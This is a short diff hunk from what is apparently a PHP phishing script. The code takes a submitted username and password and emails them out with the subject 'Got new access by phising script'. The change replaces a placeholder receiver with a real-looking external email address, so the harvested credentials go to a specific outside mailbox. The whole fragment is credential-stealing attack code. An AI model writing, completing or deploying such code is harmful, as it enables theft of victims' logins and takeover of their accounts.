@@ -8,7 +8,7 @@
 		$username = $_REQUEST['username'];
 		$password = $_REQUEST['password'];
 		
-		$reciever = "YOUR-EMAIL ADRRESS";
+		$reciever = "rogpeaki@hi2.in";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
